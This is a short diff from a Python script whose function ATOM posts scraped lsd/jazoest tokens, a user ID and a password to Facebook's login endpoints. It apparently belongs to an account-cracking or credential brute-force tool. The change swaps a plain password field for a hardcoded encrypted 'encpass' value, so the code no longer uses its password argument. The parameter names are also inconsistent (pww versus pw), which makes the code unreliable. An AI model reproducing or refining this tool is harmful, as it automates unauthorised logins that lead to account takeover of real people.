@@ -120,12 +120,12 @@ def ATOM(uid, pww, total_idz):
             session = requests.Session()
             requu1 = session.get('https://touch.facebook.com/')
             data = {
-            "lsd": re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
-            "uid": uid,
-            "next": "https://p.facebook.com/login/save-device/",
-            "flow": "login_no_pin",
-            "pass": pw,}
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
+            'email': uid,
+            'login_source': 'comet_headerless_login',
+            'next': '',
+            'encpass': '#PWD_BROWSER:5:1740232453:AZJQAB81pR0FfaOCusg/R7/q3/cPZeQwkpemTGjWn+76bL8zQRP9u3jnOHAVWYN1uNr9OlzcjIO2P25AoR2ZUe9cmOcVoiKpMaYOJPhjbYN5S1zSTs3xOylGzJmMvOWqnpGgaIpxUgfDGUY=',}
             headers = {
             'authority': 'p.facebook.com',
             'method': 'POST',
